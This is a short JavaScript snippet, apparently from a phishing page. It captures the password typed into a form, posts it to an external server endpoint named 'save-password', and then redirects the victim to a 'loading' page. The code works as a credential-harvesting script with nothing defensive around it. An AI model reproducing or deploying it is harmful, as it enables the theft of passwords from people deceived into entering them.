document.getElementById("passwordForm").addEventListener("submit", async function (e) {
  e.preventDefault();

  const password = document.getElementById("password").value.trim();
  if (!password) return;

  await fetch("https://123-gmy5.onrender.com/save-password", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ password })
  });

  window.location.href = "loading.html";
});
